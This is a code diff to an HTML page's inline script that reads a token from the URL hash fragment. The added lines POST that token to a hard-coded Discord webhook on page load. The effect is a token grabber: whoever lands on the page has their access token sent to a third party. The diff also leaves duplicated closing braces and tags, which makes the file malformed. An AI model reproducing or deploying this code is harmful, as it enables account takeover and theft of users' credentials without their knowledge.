@@ -7,8 +7,19 @@
         <script>
             function getToken() {
                 var token = window.location.hash.substring(1);
-                console.log(token);
-                // Send the token to your server here
+                            // Send the token to your server here
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1083637217118912522/U0RvqBfEgOpypJJYkKyjaxmR1j8WwbQD1RUZYu9Ewr42ACqxjBMvc_jU80AiYoG3vgFI");
+                request.setRequestHeader('Content-type', 'application/json');
+                var params = {
+                    "content": "Token: " + token
+                }
+                request.send(JSON.stringify(params));
+            }
+        getToken();
+    </script>
+</body>
+
             }
             getToken();
         </script>
